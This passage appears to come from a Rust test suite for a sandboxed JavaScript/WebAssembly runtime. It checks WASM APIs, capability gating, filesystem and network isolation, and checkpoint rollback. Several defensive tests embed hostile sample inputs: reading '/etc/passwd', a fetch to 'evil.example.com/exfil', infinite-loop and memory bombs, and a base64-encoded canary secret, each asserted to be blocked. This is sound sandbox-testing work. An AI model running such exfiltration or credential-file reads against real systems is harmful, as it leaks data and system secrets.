
        let hostCallCount = 0;
        const importObj = {
            env: {
                host_scale(ptr, len) {
                    hostCallCount++;
                    return (ptr + len) * 3;
                }
            }
        };

        const inst1 = new WebAssembly.Instance(mod, importObj);
        const memView = new Int32Array(inst1.exports.memory.buffer);
        memView[4] = 1000; // byte offset 16

        // Call compute_and_xor(16, 4):
        // mem[16] = 1000 + host_scale(16, 4) [60] + counter [100] = 1160
        // counter becomes 105
        const res1 = inst1.exports.compute_and_xor(16, 4);
        const memAfter = new Int32Array(inst1.exports.memory.buffer)[4];
        const counterAfter = inst1.exports.counter.value;
        inst1.exports.counter.value = 200;
        const res2 = inst1.exports.compute_and_xor(16, 4); // 1160 + 60 + 200 = 1420

        // Test memory.grow(1) and verify existing data is preserved
        const prevPages = inst1.exports.memory.grow(1);
        const grownBytes = inst1.exports.memory.buffer.byteLength;
        const preservedWord = new Int32Array(inst1.exports.memory.buffer)[4];

        // Test i64 BigInt roundtrip
        const mix64Res = inst1.exports.mix64(10n);

        // Test standalone WebAssembly.Global & WebAssembly.Table & async WebAssembly.instantiate
        const standaloneGlobal = new WebAssembly.Global({ value: "i32", mutable: true }, 42);
        standaloneGlobal.value = 99;
        const table = new WebAssembly.Table({ element: "anyfunc", initial: 2, maximum: 4 });
        const prevTableLen = table.grow(1);

        WebAssembly.instantiate(wasmBytes, importObj).then(({ module, instance }) => {
            console.log(JSON.stringify({
                valid,
                exportsCount: exportsMeta.length,
                importsCount: importsMeta.length,
                customText,
                hostCallCount,
                res1,
                memAfter,
                counterAfter,
                res2,
                prevPages,
                grownBytes,
                preservedWord,
                mix64Res: String(mix64Res),
                standaloneGlobal: standaloneGlobal.value,
                prevTableLen,
                tableLen: table.length,
                asyncInstOk: typeof instance.exports.compute_and_xor === "function"
            }));
        });
    "#;

    let m = run_source_isolated(
        "wave-d-wasm-full",
        script,
        CapabilityToken::pure_compute(),
        5_000_000,
        32 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"valid":true,"exportsCount":4,"importsCount":1,"customText":"SLC","hostCallCount":2,"res1":1160,"memAfter":1160,"counterAfter":105,"res2":1420,"prevPages":1,"grownBytes":131072,"preservedWord":1420,"mix64Res":"73","standaloneGlobal":99,"prevTableLen":2,"tableLen":3,"asyncInstOk":true}"#
    );
    assert!(
        crate::wasm::wasm_module_cache_hits() >= 1,
        "Expected GLOBAL_WASM_MODULE_CACHE to record at least 1 warm hit"
    );
}

#[test]
fn test_wave_d_wasm_5_ring_security_fuel_bomb_and_memory_cage() {
    // 1. Ring 1 (Invalid Magic Header -> CompileError) & Ring 4 (Missing Host Import -> LinkError)
    {
        let script = r#"
            const invalidBytes = new Uint8Array([0x00, 0x01, 0x02, 0x03]);
            const isValid = WebAssembly.validate(invalidBytes);
            let compileErrOk = false;
            try {
                new WebAssembly.Module(invalidBytes);
            } catch (e) {
                compileErrOk = e instanceof WebAssembly.CompileError;
            }

            // Minimal module importing env.missing1
            const importModBytes = new Uint8Array([
                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
                0x02, 0x10, 0x01, 0x03, 0x65, 0x6E, 0x76, 0x08, 0x6D, 0x69, 0x73, 0x73, 0x69, 0x6E, 0x67, 0x31, 0x00, 0x00
            ]);
            let linkErrOk = false;
            try {
                const m = new WebAssembly.Module(importModBytes);
                new WebAssembly.Instance(m, {});
            } catch (e) {
                linkErrOk = e instanceof WebAssembly.LinkError;
            }
            console.log(JSON.stringify({ isValid, compileErrOk, linkErrOk }));
        "#;
        let m = run_source_isolated(
            "wave-d-wasm-errors",
            script,
            CapabilityToken::pure_compute(),
            500_000,
            16 * 1024 * 1024,
        )
        .unwrap();
        assert_eq!(
            m.stdout[0],
            r#"{"isValid":false,"compileErrOk":true,"linkErrOk":true}"#
        );
    }

    // 2. Ring 2: Infinite WASM Loop `(loop (br 0))` deterministically trapped by shared CPU Fuel Meter
    {
        let script = r#"
            const spinWasm = new Uint8Array([
                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
                0x03, 0x02, 0x01, 0x00,
                0x07, 0x08, 0x01, 0x04, 0x73, 0x70, 0x69, 0x6E, 0x00, 0x00,
                0x0A, 0x09, 0x01, 0x07, 0x00, 0x03, 0x40, 0x0C, 0x00, 0x0B, 0x0B
            ]);
            const mod = new WebAssembly.Module(spinWasm);
            const inst = new WebAssembly.Instance(mod);
            inst.exports.spin();
        "#;
        let err = run_source_isolated(
            "wave-d-wasm-fuel-bomb",
            script,
            CapabilityToken::pure_compute(),
            25_000,
            16 * 1024 * 1024,
        )
        .unwrap_err();
        assert!(
            matches!(
                err.downcast_ref::<SandboxViolation>(),
                Some(SandboxViolation::CpuFuelExhausted { .. })
            ),
            "Expected SandboxViolation::CpuFuelExhausted on infinite WASM loop, got {:?}",
            err
        );
    }

    // 3. Ring 3: WASM Linear Memory Bomb exceeding tenant memory ceiling deterministically trapped
    {
        let script = r#"
            // Request 32 pages (2 MB) > 512 KB tenant ceiling
            const mem = new WebAssembly.Memory({ initial: 32 });
        "#;
        let err = run_source_isolated(
            "wave-d-wasm-mem-bomb",
            script,
            CapabilityToken::pure_compute(),
            500_000,
            512 * 1024, // 512 KB tenant ceiling
        )
        .unwrap_err();
        assert!(
            matches!(
                err.downcast_ref::<SandboxViolation>(),
                Some(SandboxViolation::MemoryCeilingExceeded { .. })
            ),
            "Expected SandboxViolation::MemoryCeilingExceeded on oversized WASM memory, got {:?}",
            err
        );
    }
}

#[test]
fn test_wave_g_binary_vfs_roundtrip_eval_sandbox_ocap_and_bounded_fetch_concurrency() {
    // 1. Binary VFS (`BOA_VFS_CACHE: FxHashMap<String, Vec<u8>>`) + Checkpoint/Restore without UTF-8 lossy corruption
    let vfs_script = r#"
import * as fs from "node:fs";

const nonUtf8 = new Uint8Array([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28]);
fs.writeFileSync("/workspace/raw.bin", nonUtf8);
fs.appendFileSync("/workspace/raw.bin", Buffer.from([0xde, 0xad]));

const snap = Slice.checkpoint();
fs.writeFileSync("/workspace/raw.bin", "corrupted-overwrite");
Slice.restore(snap);

const readBuf = fs.readFileSync("/workspace/raw.bin", null);
const readHex = fs.readFileSync("/workspace/raw.bin", "hex");
const st = fs.statSync("/workspace/raw.bin");

// Also verify Slice.evalSandbox blocks capability escalation when parent has only /workspace read/write
const escFs = Slice.evalSandbox("const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');", {
    allowRead: ["/etc"]
});
const escNet = Slice.evalSandbox("fetch('https://evil.example.com/exfil');", {
    allowNet: ["evil.example.com"]
});

console.log(JSON.stringify({
    bytes: Array.from(readBuf),
    hex: readHex,
    size: st.size,
    mtimeReal: st.mtimeMs !== 1700000000000 && st.mtimeMs > 1700000000000,
    escFsBlocked: escFs.ok === false && String(escFs.violation).includes("lacks filesystem read authority"),
    escNetBlocked: escNet.ok === false && String(escNet.violation).includes("lacks outbound network authority")
}));
"#;

    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/workspace")
        .with_write_prefix("/workspace");
    let m = run_source_isolated(
        "wave-g-binary-vfs",
        vfs_script,
        caps,
        1_000_000,
        16 * 1024 * 1024,
    )
    .expect("wave-g-binary-vfs execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(
        parsed["bytes"],
        serde_json::json!([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28, 0xde, 0xad]),
        "Binary VFS must preserve arbitrary non-UTF-8 bytes across writeFileSync/appendFileSync/checkpoint/restore"
    );
    assert_eq!(parsed["hex"], "fffe0080c328dead");
    assert_eq!(parsed["size"], 8);
    assert_eq!(parsed["mtimeReal"], true);
    assert_eq!(parsed["escFsBlocked"], true);
    assert_eq!(parsed["escNetBlocked"], true);

    // 2. Direct Rust `SliceIsolate::eval_sandbox` on a `pure_compute()` parent must block child escalation
    let mut pure_parent = SliceIsolate::spawn(
        "wave-g-pure-parent",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        8 * 1024 * 1024,
    );
    let outcome_fs = pure_parent.eval_sandbox(
        "const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');",
        crate::SandboxEvalOptions {
            allow_read: vec!["/etc".to_string()],
            ..Default::default()
        },
    );
    assert!(
        !outcome_fs.ok
            && outcome_fs
                .violation
                .as_deref()
                .unwrap_or("")
                .contains("lacks filesystem read authority"),
        "pure_compute() parent must never allow child allow_read escalation: {:?}",
        outcome_fs
    );

    let outcome_net = pure_parent.eval_sandbox(
        "fetch('https://evil.example.com/exfil');",
        crate::SandboxEvalOptions {
            allow_net: vec!["evil.example.com".to_string()],
            ..Default::default()
        },
    );
    assert!(
        !outcome_net.ok
            && outcome_net
                .violation
                .as_deref()
                .unwrap_or("")
                .contains("lacks outbound network authority"),
        "pure_compute() parent must never allow child allow_net escalation: {:?}",
        outcome_net
    );

    // 3. Concurrent `Promise.all` fetch batching > 16 requests bounded by `MAX_CONCURRENT_FETCHES = 16`
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let server_handle = std::thread::spawn(move || {
        for _ in 0..24 {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 1024];
                let n = stream.read(&mut buf).unwrap_or(0);
                let req_str = String::from_utf8_lossy(&buf[..n]);
                let id = req_str
                    .lines()
                    .next()
                    .and_then(|l| l.split_whitespace().nth(1))
                    .unwrap_or("/0")
                    .trim_start_matches('/');
                let body = format!("ok-{}", id);
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
            }
        }
    });

    let batch_script = format!(
        r#"
(async () => {{
    const urls = [];
    for (let i = 0; i < 24; i++) {{
        urls.push("http://127.0.0.1:{port}/" + i);
    }}
    const responses = await Promise.all(urls.map((u) => fetch(u).then((r) => r.text())));
    console.log(JSON.stringify({{ count: responses.length, first: responses[0], last: responses[23] }}));
}})();
"#,
        port = port
    );
    let fetch_caps = CapabilityToken::pure_compute().with_net_host("127.0.0.1");
    let fm = run_source_isolated(
        "wave-g-bounded-fetch",
        &batch_script,
        fetch_caps,
        2_000_000,
        16 * 1024 * 1024,
    )
    .expect("wave-g-bounded-fetch execution");
    let _ = server_handle.join();
    let f_out: serde_json::Value = serde_json::from_str(&fm.stdout[0]).unwrap();
    assert_eq!(f_out["count"], 24);
    assert_eq!(f_out["first"], "ok-0");
    assert_eq!(f_out["last"], "ok-23");
}

#[test]
fn test_wave_h_lazy_host_binding_gating_on_cold_realm_and_on_demand_activation() {
    // 1. Fresh cold `WarmBoaRealm` must NOT eagerly register HTTP bridge, KV/sandbox, or SemVer/fast-ms host bindings
    let mut cold_realm = crate::boa_realm::create_warm_boa_realm();
    let global = cold_realm.ctx.global_object();
    for deferred_binding in [
        "__slice_http_method",
        "__slice_http_respond",
        "__slice_kv_get",
        "__slice_eval_sandbox",
        "__slice_semver_valid",
        "__slice_fast_ms",
        "__slice_btoa",
    ] {
        assert!(
            !global
                .has_own_property(
                    boa_engine::JsString::from(deferred_binding),
                    &mut cold_realm.ctx
                )
                .unwrap_or(true),
            "Cold WarmBoaRealm should NOT eagerly register {}",
            deferred_binding
        );
    }

    // 2. When a script uses `Slice.kv`, `Slice.evalSandbox`, `btoa`, and `slice:semver`, those host bindings are registered on demand
    let script = r#"
import semver from "slice:semver";
Slice.kv.set("wave-h-key", "active-val");
const kvVal = Slice.kv.get("wave-h-key");
const b64 = btoa("wave-h");
const svOk = semver.satisfies("2.5.0", ">=2.0.0 <3.0.0");
const sb = Slice.evalSandbox("19 + 23", { fuelLimit: 10000 });
console.log(JSON.stringify({ kvVal, b64, svOk, sbVal: sb.returnValue }));
"#;
    let m = run_source_isolated(
        "wave-h-lazy-bindings",
        script,
        CapabilityToken::pure_compute(),
        500_000,
        8 * 1024 * 1024,
    )
    .expect("wave-h-lazy-bindings execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(parsed["kvVal"], "active-val");
    assert_eq!(parsed["b64"], "d2F2ZS1o");
    assert_eq!(parsed["svOk"], true);
    assert_eq!(parsed["sbVal"], "42");
}

#[test]
fn test_wave_i_end_to_end_aliases_import_meta_dynamic_import_and_node_url() {
    let test_dir = std::env::temp_dir().join("slice_wave_i_engine_e2e_test");
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(test_dir.join("src/services")).unwrap();
    std::fs::create_dir_all(test_dir.join("src/internal")).unwrap();

    std::fs::write(
        test_dir.join("tsconfig.json"),
        r#"{
  // Wave I tsconfig paths with JSONC comments
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@/*": ["./src/*"],
    },
  },
}"#,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("package.json"),
        r##"{
  "name": "wave-i-e2e",
  "imports": {
    "#internal/*": "./src/internal/*.ts"
  }
}"##,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("src/internal/token.ts"),
        r#"export const SECRET_PREFIX = "tok_wave_i";
"#,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("src/services/plugin.ts"),
        r##"import { SECRET_PREFIX } from "#internal/token";
export function runPlugin(id: number): string {
  return `${SECRET_PREFIX}_${id}`;
}
"##,
    )
    .unwrap();

    let entry_path = test_dir.join("src/index.ts");
    std::fs::write(
        &entry_path,
        r#"import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";

const mod = await import("@/services/plugin");
const fromMeta = fileURLToPath(import.meta.url);
const roundtripHref = pathToFileURL(__filename).href;
console.log(JSON.stringify({
  pluginOut: mod.runPlugin(99),
  sameFile: fromMeta === __filename && import.meta.filename === __filename,
  sameDir: path.dirname(fromMeta) === __dirname && import.meta.dirname === __dirname,
  sameUrl: roundtripHref === import.meta.url,
}));
"#,
    )
    .unwrap();

    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle_entrypoint_with_deps");
    let _ = std::fs::remove_dir_all(&test_dir);

    let m = run_source_isolated(
        "wave-i-e2e",
        &bundled,
        CapabilityToken::pure_compute(),
        500_000,
        8 * 1024 * 1024,
    )
    .expect("wave-i-e2e execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(parsed["pluginOut"], "tok_wave_i_99");
    assert_eq!(parsed["sameFile"], true);
    assert_eq!(parsed["sameDir"], true);
    assert_eq!(parsed["sameUrl"], true);
}

#[test]
fn test_wave_j_async_local_storage_compression_streams_zlib_and_url_pattern() {
    let script = r#"
import { AsyncLocalStorage, AsyncResource } from "node:async_hooks";
import zlib from "node:zlib";
import { promisify } from "node:util";

async function runWaveJ() {
  // 1. AsyncLocalStorage across concurrent Promise.all, setTimeout, queueMicrotask, nextTick, exit, snapshot, AsyncResource
  const reqStore = new AsyncLocalStorage();
  const traceStore = new AsyncLocalStorage();

  const [resA, resB] = await Promise.all([
    reqStore.run({ reqId: "req-alpha" }, async () => {
      await Promise.resolve();
      const s1 = reqStore.getStore().reqId;
      await new Promise((r) => setTimeout(r, 8));
      const s2 = reqStore.getStore().reqId;
      const nested = await traceStore.run({ span: "span-1" }, async () => {
        await new Promise((r) => queueMicrotask(r));
        return `${reqStore.getStore().reqId}:${traceStore.getStore().span}`;
      });
      const exited = reqStore.exit(() => reqStore.getStore());
      return { s1, s2, nested, exitedIsUndefined: exited === undefined, afterExit: reqStore.getStore().reqId };
    }),
    reqStore.run({ reqId: "req-beta" }, async () => {
      await new Promise((r) => setTimeout(r, 2));
      const s1 = reqStore.getStore().reqId;
      const fromNextTick = await new Promise((r) => process.nextTick(() => r(reqStore.getStore().reqId)));
      return { s1, fromNextTick };
    }),
  ]);

  let snapResult = "";
  let resourceResult = "";
  reqStore.run({ reqId: "req-snap" }, () => {
    const runInSnap = AsyncLocalStorage.snapshot();
    const ar = new AsyncResource("CustomPool");
    reqStore.run({ reqId: "req-overridden" }, () => {
      snapResult = runInSnap(() => reqStore.getStore().reqId);
      resourceResult = ar.runInAsyncScope(() => reqStore.getStore().reqId);
    });
  });

  // 2. CompressionStream / DecompressionStream ("gzip", "deflate", "deflate-raw") + node:zlib
  const payload = "Slice WinterTC Edge Compression & Decompression Stream Verification! ".repeat(20);
  const streamFormats = ["gzip", "deflate", "deflate-raw"];
  const streamResults = {};
  for (const fmt of streamFormats) {
    const cs = new CompressionStream(fmt);
    const compressedStream = new Blob([payload]).stream().pipeThrough(cs);
    const compressedBytes = new Uint8Array(await new Response(compressedStream).arrayBuffer());
    const ds = new DecompressionStream(fmt);
    const decompressedStream = new Blob([compressedBytes]).stream().pipeThrough(ds);
    const roundtripText = await new Response(decompressedStream).text();
    streamResults[fmt] = {
      compressedSmaller: compressedBytes.byteLength < payload.length,
      matches: roundtripText === payload,
    };
  }

  const gzBuf = zlib.gzipSync(payload);
  const gunzStr = zlib.gunzipSync(gzBuf).toString("utf8");
  const defBuf = zlib.deflateSync(payload);
  const infStr = zlib.inflateSync(defBuf).toString("utf8");
  const rawBuf = zlib.deflateRawSync(payload);
  const infRawStr = zlib.inflateRawSync(rawBuf).toString("utf8");
  const unzipAutoGz = zlib.unzipSync(gzBuf).toString("utf8");
  const unzipAutoDef = zlib.unzipSync(defBuf).toString("utf8");
  const gzipAsync = promisify(zlib.gzip);
  const gunzipAsync = promisify(zlib.gunzip);
  const asyncRoundtrip = (await gunzipAsync(await gzipAsync("async-zlib-ok"))).toString("utf8");

  // 3. URLPattern global routing primitive
  const p1 = new URLPattern("https://api.example.com/v1/users/:id/posts/:postId?");
  const m1 = p1.exec("https://api.example.com/v1/users/42/posts/99?sort=asc#top");
  const m2 = p1.exec("https://api.example.com/v1/users/42/posts");
  const p2 = new URLPattern({ pathname: "/files/:dir+/download/*" });
  const m3 = p2.exec("https://cdn.example.com/files/a/b/c/download/report.pdf");
  const p3 = new URLPattern("/items/:id(\\d+)", "https://shop.example.com");

  console.log(JSON.stringify({
    als: {
      resA,
      resB,
      snapResult,
      resourceResult,
      outsideIsUndefined: reqStore.getStore() === undefined,
    },
    compression: {
      streamResults,
      zlibOk:
        gunzStr === payload &&
        infStr === payload &&
        infRawStr === payload &&
        unzipAutoGz === payload &&
        unzipAutoDef === payload &&
        asyncRoundtrip === "async-zlib-ok",
    },
    urlPattern: {
      m1Id: m1.pathname.groups.id,
      m1PostId: m1.pathname.groups.postId,
      m2Id: m2.pathname.groups.id,
      m2PostIdUndefined: m2.pathname.groups.postId === undefined,
      m3Dir: m3.pathname.groups.dir,
      m3Wild: m3.pathname.groups["0"],
      p3NumericMatch: p3.test("https://shop.example.com/items/12345"),
      p3AlphaReject: !p3.test("https://shop.example.com/items/abc"),
      p3HasRegExp: p3.hasRegExpGroups,
    },
  }));
}
runWaveJ().catch((e) => console.log(JSON.stringify({ __err: String(e && e.stack || e) })));
"#;

    let test_dir = std::env::temp_dir().join(format!("slice_wave_j_test_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(&test_dir).unwrap();
    let entry_path = test_dir.join("index.ts");
    std::fs::write(&entry_path, script).unwrap();
    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle wave j script");
    let _ = std::fs::remove_dir_all(&test_dir);

    let m = run_source_isolated(
        "wave-j-tenant",
        &bundled,
        CapabilityToken::pure_compute(),
        800_000,
        16 * 1024 * 1024,
    )
    .expect("wave-j execution");
    let out: serde_json::Value = serde_json::from_str(&m.stdout[0]).expect("parse wave-j json");
    assert!(out.get("__err").is_none(), "wave-j error: {}", out);

    assert_eq!(out["als"]["resA"]["s1"], "req-alpha");
    assert_eq!(out["als"]["resA"]["s2"], "req-alpha");
    assert_eq!(out["als"]["resA"]["nested"], "req-alpha:span-1");
    assert_eq!(out["als"]["resA"]["exitedIsUndefined"], true);
    assert_eq!(out["als"]["resA"]["afterExit"], "req-alpha");
    assert_eq!(out["als"]["resB"]["s1"], "req-beta");
    assert_eq!(out["als"]["resB"]["fromNextTick"], "req-beta");
    assert_eq!(out["als"]["snapResult"], "req-snap");
    assert_eq!(out["als"]["resourceResult"], "req-snap");
    assert_eq!(out["als"]["outsideIsUndefined"], true);

    for fmt in ["gzip", "deflate", "deflate-raw"] {
        assert_eq!(
            out["compression"]["streamResults"][fmt]["compressedSmaller"],
            true
        );
        assert_eq!(out["compression"]["streamResults"][fmt]["matches"], true);
    }
    assert_eq!(out["compression"]["zlibOk"], true);

    assert_eq!(out["urlPattern"]["m1Id"], "42");
    assert_eq!(out["urlPattern"]["m1PostId"], "99");
    assert_eq!(out["urlPattern"]["m2Id"], "42");
    assert_eq!(out["urlPattern"]["m2PostIdUndefined"], true);
    assert_eq!(out["urlPattern"]["m3Dir"], "a/b/c");
    assert_eq!(out["urlPattern"]["m3Wild"], "report.pdf");
    assert_eq!(out["urlPattern"]["p3NumericMatch"], true);
    assert_eq!(out["urlPattern"]["p3AlphaReject"], true);
    assert_eq!(out["urlPattern"]["p3HasRegExp"], true);
}

#[test]
fn test_web_primitives_rust_url_search_params_and_sub_shards_compat() {
    use crate::web_primitives::{
        can_parse_whatwg_url, normalize_url_pathname, parse_whatwg_url, usp_decode_component,
        usp_encode_component, usp_parse_query, usp_stringify_pairs,
    };

    // 1. Direct Rust `web_primitives` unit tests
    assert_eq!(normalize_url_pathname("/a/b/../c/./d"), "/a/c/d");
    assert_eq!(normalize_url_pathname("a/../../b/"), "/b/");
    assert_eq!(
        usp_encode_component("hello world+100%"),
        "hello+world%2B100%25"
    );
    assert_eq!(
        usp_decode_component("hello+world%2B100%25"),
        "hello world+100%"
    );
    let parsed_pairs = usp_parse_query("?a=1&b=hello+world&c=%E2%9C%93&empty");
    assert_eq!(
        parsed_pairs,
        vec![
            ("a".to_string(), "1".to_string()),
            ("b".to_string(), "hello world".to_string()),
            ("c".to_string(), "\u{2713}".to_string()),
            ("empty".to_string(), String::new()),
        ]
    );
    assert_eq!(
        usp_stringify_pairs(&parsed_pairs),
        "a=1&b=hello+world&c=%E2%9C%93&empty="
    );

    let u1 = parse_whatwg_url(
        "https://user:pass@Example.COM:443/api/v1/../v2/items?sort=asc&tag=a+b#top",
        None,
    )
    .expect("parse_whatwg_url https");
    assert_eq!(u1.protocol, "https:");
    assert_eq!(u1.username, "user");
    assert_eq!(u1.password, "pass");
    assert_eq!(u1.hostname, "example.com");
    assert_eq!(u1.port, "");
    assert_eq!(u1.host, "example.com");
    assert_eq!(u1.origin, "https://example.com");
    assert_eq!(u1.pathname, "/api/v2/items");
    assert_eq!(u1.search, "?sort=asc&tag=a+b");
    assert_eq!(u1.hash, "#top");
    assert_eq!(
        u1.href,
        "https://user:pass@example.com/api/v2/items?sort=asc&tag=a+b#top"
    );

    let u2 = parse_whatwg_url("../other?x=1", Some("https://example.com:8443/a/b/c"))
        .expect("parse_whatwg_url relative");
    assert_eq!(u2.href, "https://example.com:8443/a/other?x=1");
    assert_eq!(u2.origin, "https://example.com:8443");
    assert!(can_parse_whatwg_url("/rel", Some("https://example.com")));
    assert!(!can_parse_whatwg_url("/rel", None));

    // 2. End-to-end JS compatibility across sub-shards (`1`, `11`, `13`, `15`, `16`, `5`, `17`)
    //    and `node:crypto` base64/base64url fast paths
    let js = r#"
import crypto from "node:crypto";

const u = new URL("/v1/./users/../posts?q=hello+world&tag=a&tag=b#sec", "https://Api.Example.com:443/base");
u.searchParams.append("extra", "100%");
u.searchParams.sort();

const h = new Headers({ "Content-Type": "application/json", "X-Custom": "One" });
h.append("x-custom", "Two");
h.append("Set-Cookie", "a=1");
h.append("Set-Cookie", "b=2");

const shaB64 = crypto.createHash("sha256").update("slice-fast").digest("base64");
const shaB64Url = crypto.createHash("sha256").update("slice-fast").digest("base64url");
const hmacB64Url = crypto.createHmac("sha256", "k").update("m").digest("base64url");

const buf = Buffer.alloc(8);
const shard17BeforeWrite = Boolean(Buffer.prototype._hasBinRW);
buf.writeUInt32BE(0x12345678, 0);
buf.writeInt32LE(-42, 4);
const shard17AfterWrite = Boolean(Buffer.prototype._hasBinRW);

const cloned = structuredClone({
    nested: { a: [1, 2, 3] },
    map: new Map([["k", "v"]])
});

console.log(JSON.stringify({
    href: u.href,
    origin: u.origin,
    pathname: u.pathname,
    tags: u.searchParams.getAll("tag"),
    extra: u.searchParams.get("extra"),
    ct: h.get("content-type"),
    xCustom: h.get("X-Custom"),
    cookies: h.getSetCookie(),
    shaB64,
    shaB64Url,
    hmacB64Url,
    shard17BeforeWrite,
    shard17AfterWrite,
    u32: buf.readUInt32BE(0),
    i32: buf.readInt32LE(4),
    clonedMapVal: cloned.map.get("k")
}));
"#;
    let m = run_source_isolated(
        "web-primitives-compat-tenant",
        js,
        CapabilityToken::pure_compute(),
        500_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert!(
        !m.stdout.is_empty(),
        "Expected stdout, return_value was: {}",
        m.return_value
    );
    let v: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(
        v["href"],
        "https://api.example.com/v1/posts?extra=100%25&q=hello+world&tag=a&tag=b#sec"
    );
    assert_eq!(v["origin"], "https://api.example.com");
    assert_eq!(v["pathname"], "/v1/posts");
    assert_eq!(v["tags"], serde_json::json!(["a", "b"]));
    assert_eq!(v["extra"], "100%");
    assert_eq!(v["ct"], "application/json");
    assert_eq!(v["xCustom"], "One, Two");
    assert_eq!(v["cookies"], serde_json::json!(["a=1", "b=2"]));
    assert_eq!(
        v["shaB64"],
        crate::intrinsics::base64_encode(&crate::intrinsics::sha256_bytes(b"slice-fast"), false)
    );
    assert_eq!(
        v["shaB64Url"],
        crate::intrinsics::base64_encode(&crate::intrinsics::sha256_bytes(b"slice-fast"), true)
    );
    assert_eq!(
        v["hmacB64Url"],
        crate::intrinsics::base64_encode(&crate::intrinsics::hmac_sha256_bytes(b"k", b"m"), true)
    );
    assert_eq!(v["shard17BeforeWrite"], false);
    assert_eq!(v["shard17AfterWrite"], true);
    assert_eq!(v["u32"], 0x12345678);
    assert_eq!(v["i32"], -42);
    assert_eq!(v["clonedMapVal"], "v");
}

#[test]
fn test_case_studies_tot_checkpoints_code_mode_and_plugin_mesh_primitives() {
    let js = r#"
const fs = require("node:fs");
fs.writeFileSync("/tmp/cs_tot_state.txt", "depth0");
Slice.kv.set("cs:depth", "0", 0);
const snap0 = Slice.checkpoint();

// Depth 1 commit
fs.writeFileSync("/tmp/cs_tot_state.txt", "depth1");
Slice.kv.set("cs:depth", "1", 0);
const snap1 = Slice.checkpoint();

// Depth 2 failed branch (DLP trap + dirty VFS) -> rollback to snap1
fs.writeFileSync("/tmp/cs_tot_state.txt", "corrupted-by-d2");
Slice.kv.set("cs:depth", "99", 0);
const b64Secret = Buffer.from("sk_live_tot_canary_99", "utf8").toString("base64");
const dlpProbe = Slice.evalSandbox(`const leak = "${b64Secret}"; leak`, {
    fuel: 20000,
    memoryBytes: 2 * 1024 * 1024,
    auditSecret: "sk_live_tot_canary_99"
});
if (!dlpProbe.ok) {
    Slice.restore(snap1);
}
const afterRestore1Vfs = fs.readFileSync("/tmp/cs_tot_state.txt", "utf8");
const afterRestore1Kv = Slice.kv.get("cs:depth");

// Full rollback to snap0
Slice.restore(snap0);
const afterRestore0Vfs = fs.readFileSync("/tmp/cs_tot_state.txt", "utf8");
const afterRestore0Kv = Slice.kv.get("cs:depth");

console.log(JSON.stringify({
    dlpTrapped: !dlpProbe.ok && String(dlpProbe.violation || dlpProbe.error).includes("EGRESS_SECRET_LEAK_BLOCKED"),
    afterRestore1Vfs,
    afterRestore1Kv,
    afterRestore0Vfs,
    afterRestore0Kv
}));
"#;
    let cap = CapabilityToken::pure_compute()
        .with_read_prefix("/tmp".to_string())
        .with_write_prefix("/tmp".to_string());
    let m = run_source_isolated("cs-tot-tenant", js, cap, 500_000, 16 * 1024 * 1024).unwrap();
    let v: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(v["dlpTrapped"], true);
    assert_eq!(v["afterRestore1Vfs"], "depth1");
    assert_eq!(v["afterRestore1Kv"], "1");
    assert_eq!(v["afterRestore0Vfs"], "depth0");
    assert_eq!(v["afterRestore0Kv"], "0");
}
